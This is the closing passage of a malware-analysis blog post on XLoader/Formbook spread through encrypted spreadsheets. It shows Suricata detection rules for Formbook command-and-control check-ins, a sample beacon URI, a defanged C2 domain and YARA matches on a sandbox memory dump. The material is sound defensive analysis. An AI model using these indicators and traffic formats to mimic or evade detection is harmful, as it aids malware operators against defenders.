</span><span class="gp">emerging-malware.rules:alert http $</span>HOME_NET any -&gt; <span class="nv">$EXTERNAL_NET</span> any <span class="o">(</span>msg:<span class="s2">"ET MALWARE FormBook CnC Checkin (GET)"</span><span class="p">;</span> flow:established,to_server<span class="p">;</span> content:<span class="s2">"Connection|3a 20|close|0d 0a 0d 0a 00 00 00 00 00 00|"</span><span class="p">;</span> fast_pattern<span class="p">;</span> http.method<span class="p">;</span> content:<span class="s2">"GET"</span><span class="p">;</span> http.uri<span class="p">;</span> content:<span class="s2">"/?"</span><span class="p">;</span> pcre:<span class="s2">"/^[A-Za-z0-9_-]{1,15}=(?:[A-Za-z0-9-_]{1,25}|(?:[A-Za-z0-9+/]{4})*(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=|[A-Za-z0-9+/]{4}))&amp;[A-Za-z0-9-]{1,15}=(?:[A-Za-z0-9-_]{1,25}|(?:[A-Za-z0-9+/]{4})*(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=|[A-Za-z0-9+/]{4}))(?:&amp;sql=</span><span class="se">\d</span><span class="s2">*)?</span><span class="nv">$/</span><span class="s2">R"</span><span class="p">;</span> http.connection<span class="p">;</span> content:<span class="s2">"close"</span><span class="p">;</span> depth:5<span class="p">;</span> endswith<span class="p">;</span> http.header_names<span class="p">;</span> content:<span class="s2">"|0d 0a|Host|0d 0a|Connection|0d 0a 0d 0a|"</span><span class="p">;</span> depth:22<span class="p">;</span> endswith<span class="p">;</span> reference:md5,a6a114f6bc3e86e142256c5a53675d1a<span class="p">;</span> classtype:command-and-control<span class="p">;</span> sid:2031449<span class="p">;</span> rev:9<span class="p">;</span> metadata:attack_target Client_Endpoint, created_at 2017_12_19, former_category MALWARE, performance_impact Moderate, signature_severity Major, updated_at 2020_12_16<span class="p">;</span><span class="o">)</span>
<span class="go">
</span><span class="gp">emerging-malware.rules:alert http $</span>HOME_NET any -&gt; <span class="nv">$EXTERNAL_NET</span> any <span class="o">(</span>msg:<span class="s2">"ET MALWARE FormBook CnC Checkin (GET)"</span><span class="p">;</span> flow:established,to_server<span class="p">;</span> content:<span class="s2">"Connection|3a 20|close|0d 0a 0d 0a 00 00 00 00 00 00|"</span><span class="p">;</span> fast_pattern<span class="p">;</span> http.method<span class="p">;</span> content:<span class="s2">"GET"</span><span class="p">;</span> http.uri<span class="p">;</span> content:<span class="s2">"/?"</span><span class="p">;</span> pcre:<span class="s2">"/^[A-Za-z0-9_-]{1,15}=(?:[A-Za-z0-9-_]{1,25}|(?:[A-Za-z0-9+/]{4})*(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=|[A-Za-z0-9+/]{4}))&amp;[A-Za-z0-9-]{1,15}=(?:[A-Za-z0-9-_]{1,25}|(?:[A-Za-z0-9+/]{4})*(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=|[A-Za-z0-9+/]{4}))(?:&amp;sql=</span><span class="se">\d</span><span class="s2">*)?</span><span class="nv">$/</span><span class="s2">R"</span><span class="p">;</span> http.connection<span class="p">;</span> content:<span class="s2">"close"</span><span class="p">;</span> depth:5<span class="p">;</span> endswith<span class="p">;</span> http.header_names<span class="p">;</span> content:<span class="s2">"|0d 0a|Host|0d 0a|Connection|0d 0a 0d 0a|"</span><span class="p">;</span> depth:22<span class="p">;</span> endswith<span class="p">;</span> reference:md5,a6a114f6bc3e86e142256c5a53675d1a<span class="p">;</span> classtype:command-and-control<span class="p">;</span> sid:2031453<span class="p">;</span> rev:9<span class="p">;</span> metadata:attack_target Client_Endpoint, created_at 2017_12_19, former_category MALWARE, performance_impact Moderate, signature_severity Major, updated_at 2020_12_23<span class="p">;</span><span class="o">)</span>
</pre></table></code></div></div><p><img data-src="/assets/images/xloader-formbook-velvetsweatshop-spreadsheet/wireshark-1.png" alt="Wireshark Inspection" data-proofer-ignore></p><p>The first big pattern in the rules, <code class="language-plaintext highlighter-rouge">content:"Connection|3a 20|close|0d 0a 0d 0a 00 00 00 00 00 00|"</code>, is matched in a packet going to <code class="language-plaintext highlighter-rouge">www.appleburyschool[.]com</code>. Finally, the rest of the URI for the request matches a massive regular expression for Formbook/Xloader.</p><pre><code class="language-regex">/^[A-Za-z0-9_-]{1,15}=(?:[A-Za-z0-9-_]{1,25}|(?:[A-Za-z0-9+/]{4})*(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=|[A-Za-z0-9+/]{4}))&amp;[A-Za-z0-9-]{1,15}=(?:[A-Za-z0-9-_]{1,25}|(?:[A-Za-z0-9+/]{4})*(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=|[A-Za-z0-9+/]{4}))(?:&amp;sql=\d*)?$/R
</code></pre><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>/b80i/?1bwhC=javT2wWCzY2TGjiLQcDYfNXvB4BbgLustNQoY/LvZGM3F6OzxMpM5exhHgP5m5g5&amp;tB=TtdpPpwhOb1
</pre></table></code></div></div><p>It’s also possible to validate findings using the memory dumps in Triage! One of the fields in Triage indicated a YARA rule tripped on the memory dump <code class="language-plaintext highlighter-rouge">636-73-0x0000000000400000-0x0000000000429000-memory.dmp</code>, which can be downloaded. This is a memory dump from process ID 636 in that sandbox report, which corresponds to an evil <code class="language-plaintext highlighter-rouge">lzxupx.exe</code> process. Using <code class="language-plaintext highlighter-rouge">yara-rules</code>, we can see some evidence of Formbook:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre><span class="gp">remnux@remnux:~/cases/xloader-doc$</span><span class="w"> </span>yara-rules <span class="nt">-s</span> 636-73-0x0000000000400000-0x0000000000429000-memory.dmp 
<span class="go">CRC32b_poly_Constant 636-73-0x0000000000400000-0x0000000000429000-memory.dmp
</span><span class="gp">0x8bb7:$</span>c0: B7 1D C1 04
<span class="go">
</span><span class="c">...
</span><span class="go">
Formbook 636-73-0x0000000000400000-0x0000000000429000-memory.dmp
</span><span class="gp">0x16ad9:$</span>sqlite3step: 68 34 1C 7B E1
<span class="gp">0x16bec:$</span>sqlite3step: 68 34 1C 7B E1
<span class="gp">0x16b08:$</span>sqlite3text: 68 38 2A 90 C5
<span class="gp">0x16c2d:$</span>sqlite3text: 68 38 2A 90 C5
<span class="gp">0x16b1b:$</span>sqlite3blob: 68 53 D8 7F 8C
<span class="gp">0x16c43:$</span>sqlite3blob: 68 53 D8 7F 8C
<span class="go">
</span><span class="c">...
</span></pre></table></code></div></div><p>It looks like the contents of memory trip a YARA rules from JPCERT designed to detect Formbook in memory: <a href="https://github.com/Yara-Rules/rules/blob/master/malware/MalConfScan.yar#L381">https://github.com/Yara-Rules/rules/blob/master/malware/MalConfScan.yar#L381</a></p><p>That’s all for now, folks, thanks for reading!</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/malware/'>malware</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/malware/" class="post-tag no-text-decoration" >malware</a> <a href="/tags/xloader/" class="post-tag no-text-decoration" >xloader</a> <a href="/tags/formbook/" class="post-tag no-text-decoration" >formbook</a> <a href="/tags/xlsx/" class="post-tag no-text-decoration" >xlsx</a> <a href="/tags/velvetsweatshop/" class="post-tag no-text-decoration" >velvetsweatshop</a> <a href="/tags/equationeditor/" class="post-tag no-text-decoration" >equationeditor</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=XLoader/Formbook Distributed by Encrypted VelvetSweatshop Spreadsheets - Tony Lambert&amp;url=https://forensicitguy.github.io/xloader-formbook-velvetsweatshop-spreadsheet/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=XLoader/Formbook Distributed by Encrypted VelvetSweatshop Spreadsheets - Tony Lambert&amp;u=https://forensicitguy.github.io/xloader-formbook-velvetsweatshop-spreadsheet/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https://forensicitguy.github.io/xloader-formbook-velvetsweatshop-spreadsheet/&amp;text=XLoader/Formbook Distributed by Encrypted VelvetSweatshop Spreadsheets - Tony Lambert" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <a href="https://www.linkedin.com/sharing/share-offsite/?url=https://forensicitguy.github.io/xloader-formbook-velvetsweatshop-spreadsheet/" data-toggle="tooltip" data-placement="top" title="Linkedin" target="_blank" rel="noopener" aria-label="Linkedin"> <i class="fa-fw fab fa-linkedin"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/pecheck-malware-weight-loss/">Bad Guys Hate This Trick for Malware Weight Loss!</a><li><a href="/formbook-via-vbs-powershell-and-csharp/">Formbook Distributed Via VBScript, PowerShell, and C# Code</a><li><a href="/agenttesla-vba-certutil-download/">An AgentTesla Sample Using VBA Macros and Certutil</a><li><a href="/my-sans-dfir-netwars-experience/">My SANS DFIR NetWars Experience</a><li><a href="/making-meterpreter-look-google-signed/">Making Meterpreter Look Google Signed</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/malware/">malware</a> <a class="post-tag" href="/tags/powershell/">powershell</a> <a class="post-tag" href="/tags/msi/">msi</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/agenttesla/">agenttesla</a> <a class="post-tag" href="/tags/ld-preload/">ld_preload</a> <a class="post-tag" href="/tags/mshta/">mshta</a> <a class="post-tag" href="/tags/net/">.net</a> <a class="post-tag" href="/tags/cobalt-strike/">cobalt-strike</a> <a class="post-tag" href="/tags/csharp/">csharp</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/formbook-via-vbs-powershell-and-csharp/"><div class="card-body"> <em class="timeago small" data-ts="1648166400" > 2022-03-25 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Formbook Distributed Via VBScript, PowerShell, and C# Code</h3><div class="text-muted small"><p> Formbook is one of the threats that I categorize as part of the “background noise of exploitation” on the internet. While targeted attacks occur in scoped areas, anyone can go buy access for Formbo...</p></div></div></a></div><div class="card"> <a href="/agenttesla-rtf-dotnet-tradecraft/"><div class="card-body"> <em class="timeago small" data-ts="1644105600" > 2022-02-06 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>AgentTesla From RTF Exploitation to .NET Tradecraft</h3><div class="text-muted small"><p> When adversaries buy and deploy threats like AgentTesla you often see this functional and entertaining chain of older exploitation activity with some .NET framework tradecraft you’d expect from som...</p></div></div></a></div><div class="card"> <a href="/how-qbot-uses-esentutl/"><div class="card-body"> <em class="timeago small" data-ts="1612137600" > 2021-02-01 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>How Qbot Uses Esentutl</h3><div class="text-muted small"><p> A colleague asked me a question today about the relationship between Qbot and a Windows system utility: esentutl.exe. It’s been sparsely documented via tweet, and I want to more fully explain why Q...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/agenttesla-rtf-dotnet-tradecraft/" class="btn btn-outline-primary" prompt="Older"><p>AgentTesla From RTF Exploitation to .NET Tradecraft</p></a> <a href="/analyzing-stealer-msi-using-msitools/" class="btn btn-outline-primary" prompt="Newer"><p>Analyzing a Stealer MSI using msitools</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://twitter.com/ForensicITGuy">Tony Lambert</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/malware/">malware</a> <a class="post-tag" href="/tags/powershell/">powershell</a> <a class="post-tag" href="/tags/msi/">msi</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/agenttesla/">agenttesla</a> <a class="post-tag" href="/tags/ld-preload/">ld_preload</a> <a class="post-tag" href="/tags/mshta/">mshta</a> <a class="post-tag" href="/tags/net/">.net</a> <a class="post-tag" href="/tags/cobalt-strike/">cobalt-strike</a> <a class="post-tag" href="/tags/csharp/">csharp</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-THRVSJGH6S"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-THRVSJGH6S'); }); </script>
